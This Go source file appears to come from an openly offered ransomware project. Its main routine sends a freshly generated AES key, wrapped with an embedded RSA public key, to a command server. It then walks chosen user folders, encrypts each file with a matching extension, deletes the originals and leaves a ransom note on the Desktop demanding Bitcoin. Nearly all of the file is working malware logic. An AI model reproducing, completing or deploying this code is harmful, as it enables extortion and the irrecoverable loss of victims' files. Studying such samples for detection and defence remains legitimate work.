package main

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"net/url"
	"os"
	"path/filepath"
	"time"

	"github.com/mauri870/cryptofile/crypto"
	"github.com/mauri870/ransomware/client"
	"github.com/mauri870/ransomware/rsa"
	"github.com/mauri870/ransomware/utils"
)

var (
	// RSA Public key
	// Automatically injected on autobuild with make
	PUB_KEY = []byte(`INJECT_PUB_KEY_HERE`)

	// Time to keep trying persist new keys on server
	SecondsToTimeout = 5.0
)

func encryptFiles() {
	keys := make(map[string]string)
	start := time.Now()
	// Loop creating new keys if server return an validation error
	for {
		// Check for timeout
		if duration := time.Since(start); duration.Seconds() >= SecondsToTimeout {
			log.Println("Timeout reached. Aborting...")
			return
		}

		// Generate the id and encryption key
		keys["id"], _ = utils.GenerateRandomANString(32)
		keys["enckey"], _ = utils.GenerateRandomANString(32)

		// Create the json payload
		payload := fmt.Sprintf(`{"id": "%s", "enckey": "%s"}`, keys["id"], keys["enckey"])

		// Encrypting with RSA-2048
		ciphertext, err := rsa.Encrypt(PUB_KEY, []byte(payload))
		if err != nil {
			log.Println(err)
			continue
		}

		// Call the server to validate and store the keys
		data := url.Values{}
		data.Add("payload", hex.EncodeToString(ciphertext))
		res, err := client.CallServer("POST", "/api/keys/add", data)
		if err != nil {
			log.Println("The server refuse connection. Aborting...")
			return
		}

		// handle possible response statuses
		switch res.StatusCode {
		case 200, 204:
			// \o/
			break
		case 409:
			log.Println("Duplicated ID, trying to generate a new keypair")
			continue
		default:
			log.Printf("An error ocurred, the server respond with status %d\n"+
				" Possible bad encryption or bad json payload\n", res.StatusCode)
			continue
		}

		// Success, proceed
		break
	}

	log.Println("Walking interesting dirs and indexing files...")

	// Loop over the interesting directories
	for _, f := range InterestingDirs {
		folder := BaseDir + f
		filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
			ext := filepath.Ext(path)
			if ext != "" {
				// Matching extensions
				if utils.StringInSlice(ext[1:], InterestingExtensions) {
					file := File{f, ext[1:], path}
					MatchedFiles = append(MatchedFiles, file)
					log.Println("Matched:", path)
				}
			}
			return nil
		})
	}

	// Loop over the matched files
	for _, file := range MatchedFiles {
		log.Printf("Encrypting %s...\n", file.Path)

		// Read the file content
		text, err := ioutil.ReadFile(file.Path)
		if err != nil {
			// In case of error, continue to the next file
			log.Println(err)
			continue
		}

		// Encrypting using AES-256-CFB
		ciphertext, err := crypto.Encrypt([]byte(keys["enckey"]), text)
		if err != nil {
			// In case of error, continue to the next file
			log.Println(err)
			continue
		}

		// Write a new file with the encrypted content followed by the custom extension
		err = ioutil.WriteFile(file.Path+EncryptionExtension, ciphertext, 0600)
		if err != nil {
			// In case of error, continue to the next file
			log.Println(err)
			continue
		}

		// Remove the original file
		err = os.Remove(file.Path)
		if err != nil {
			// In case of error, continue to the next file
			log.Println("Cannot delete original file, skipping...")
		}
	}

	if len(MatchedFiles) > 0 {
		message := `
		<pre>
		YOUR FILES HAVE BEEN ENCRYPTED USING A STRONG
		AES-256 ALGORITHM.

		YOUR IDENTIFICATION IS %s

		PLEASE SEND %s TO THE FOLLOWING WALLET 

			    %s

		TO RECOVER THE KEY NECESSARY TO DECRYPT YOUR
		FILES

		AFTER RECOVER YOUR KEY, RUN THE FOLLOWING:
		%s decrypt yourkeyhere
		</pre>
		`
		content := []byte(fmt.Sprintf(message, keys["id"], "0.345 BTC", "XWpXtxrJpSsRx5dICGjUOwkrhIypJKVr", os.Args[0]))

		// Write the READ_TO_DECRYPT on Desktop
		ioutil.WriteFile(BaseDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)

		log.Println("Done! Don't forget to read the READ_TO_DECRYPT.html file on Desktop")
	}
}
